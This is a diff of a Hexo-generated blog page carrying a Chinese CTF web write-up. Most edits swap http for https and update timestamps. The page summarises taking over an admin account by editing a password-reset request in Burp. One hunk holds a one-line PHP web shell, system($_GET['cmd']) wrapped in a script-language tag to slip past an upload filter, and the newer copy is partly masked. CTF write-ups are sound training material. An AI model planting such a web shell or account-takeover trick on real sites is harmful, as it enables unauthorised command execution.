@@ -10,30 +10,30 @@
   <meta name="description" content="xctf-web bug 打开a网页，先注册，再登录，发现admin的用户名已被注册，注册随便其他的名字登录    发现Manage功能仅admin才可以使用，寻找在什么条件下才能admin登录，并没有找到注入点，发现findpwd界面，burp截包，如果将该包的username改为admin是不是就可以将admin的密码修改并登录   成功登录admin，但是发现Manage仍然不可用，IP N">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ctf-web4">
-<meta property="og:url" content="http://zmh2000829.github.io/2020/08/26/ctf-web4/index.html">
+<meta property="og:url" content="https://zmh2000829.github.io/2020/08/26/ctf-web4/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="xctf-web bug 打开a网页，先注册，再登录，发现admin的用户名已被注册，注册随便其他的名字登录    发现Manage功能仅admin才可以使用，寻找在什么条件下才能admin登录，并没有找到注入点，发现findpwd界面，burp截包，如果将该包的username改为admin是不是就可以将admin的密码修改并登录   成功登录admin，但是发现Manage仍然不可用，IP N">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://zmh2000829.github.io/2020/08/26/ctf-web4/1.png">
-<meta property="og:image" content="http://zmh2000829.github.io/2020/08/26/ctf-web4/2.png">
-<meta property="og:image" content="http://zmh2000829.github.io/2020/08/26/ctf-web4/3.png">
-<meta property="og:image" content="http://zmh2000829.github.io/2020/08/26/ctf-web4/4.png">
-<meta property="og:image" content="http://zmh2000829.github.io/2020/08/26/ctf-web4/5.png">
-<meta property="og:image" content="http://zmh2000829.github.io/2020/08/26/ctf-web4/6.png">
-<meta property="og:image" content="http://zmh2000829.github.io/2020/08/26/ctf-web4/7.png">
-<meta property="og:image" content="http://zmh2000829.github.io/2020/08/26/ctf-web4/8.png">
-<meta property="og:image" content="http://zmh2000829.github.io/2020/08/26/ctf-web4/11.png">
-<meta property="og:image" content="http://zmh2000829.github.io/2020/08/26/ctf-web4/10.png">
-<meta property="og:image" content="http://zmh2000829.github.io/2020/08/26/ctf-web4/12.png">
-<meta property="og:image" content="http://zmh2000829.github.io/2020/08/26/ctf-web4/16.png">
-<meta property="og:image" content="http://zmh2000829.github.io/2020/08/26/ctf-web4/18.png">
-<meta property="og:image" content="http://zmh2000829.github.io/2020/08/26/ctf-web4/19.png">
-<meta property="og:image" content="http://zmh2000829.github.io/2020/08/26/ctf-web4/.png">
+<meta property="og:image" content="https://zmh2000829.github.io/2020/08/26/ctf-web4/1.png">
+<meta property="og:image" content="https://zmh2000829.github.io/2020/08/26/ctf-web4/2.png">
+<meta property="og:image" content="https://zmh2000829.github.io/2020/08/26/ctf-web4/3.png">
+<meta property="og:image" content="https://zmh2000829.github.io/2020/08/26/ctf-web4/4.png">
+<meta property="og:image" content="https://zmh2000829.github.io/2020/08/26/ctf-web4/5.png">
+<meta property="og:image" content="https://zmh2000829.github.io/2020/08/26/ctf-web4/6.png">
+<meta property="og:image" content="https://zmh2000829.github.io/2020/08/26/ctf-web4/7.png">
+<meta property="og:image" content="https://zmh2000829.github.io/2020/08/26/ctf-web4/8.png">
+<meta property="og:image" content="https://zmh2000829.github.io/2020/08/26/ctf-web4/11.png">
+<meta property="og:image" content="https://zmh2000829.github.io/2020/08/26/ctf-web4/10.png">
+<meta property="og:image" content="https://zmh2000829.github.io/2020/08/26/ctf-web4/12.png">
+<meta property="og:image" content="https://zmh2000829.github.io/2020/08/26/ctf-web4/16.png">
+<meta property="og:image" content="https://zmh2000829.github.io/2020/08/26/ctf-web4/18.png">
+<meta property="og:image" content="https://zmh2000829.github.io/2020/08/26/ctf-web4/19.png">
+<meta property="og:image" content="https://zmh2000829.github.io/2020/08/26/ctf-web4/.png">
 <meta property="article:published_time" content="2020-08-26T07:57:41.000Z">
-<meta property="article:modified_time" content="2020-08-29T12:57:34.130Z">
+<meta property="article:modified_time" content="2020-08-29T13:09:34.712Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://zmh2000829.github.io/2020/08/26/ctf-web4/1.png">
+<meta name="twitter:image" content="https://zmh2000829.github.io/2020/08/26/ctf-web4/1.png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -76,7 +76,7 @@
         <a id="nav-search-btn" class="nav-icon" title="Search"></a>
       </nav>
       <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://zmh2000829.github.io"></form>
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://zmh2000829.github.io"></form>
       </div>
     </div>
   </div>
@@ -129,7 +129,7 @@
 </li>
 </ol>
 <p>​       发现会提示Something shows it is a php!说明绕过了php后缀的限制，但是对php的内容仍然有检测，比如&lt;?php 的检测，经百度发现下面语法也可以达到php的效果。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt; highlight_file(<span class="keyword">__FILE__</span>);system($_GET[<span class="string">'cmd'</span>]);&lt;script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s****cript language=<span class="string">"php"</span>&gt; highlight_file(<span class="keyword">__FILE__</span>);system($_GET[<span class="string">'cmd'</span>]);&lt;**script**&gt;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/08/26/ctf-web4/6.png" alt></p>
 <p><img src="/2020/08/26/ctf-web4/7.png" alt></p>
@@ -176,7 +176,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://zmh2000829.github.io/2020/08/26/ctf-web4/" data-id="ckefn2l7900012svb92rd2ai6" class="article-share-link">Share</a>
+      <a data-url="https://zmh2000829.github.io/2020/08/26/ctf-web4/" data-id="ckefowzhj0005kovbglyl2k6u" class="article-share-link">Share</a>
       
       
     </footer>
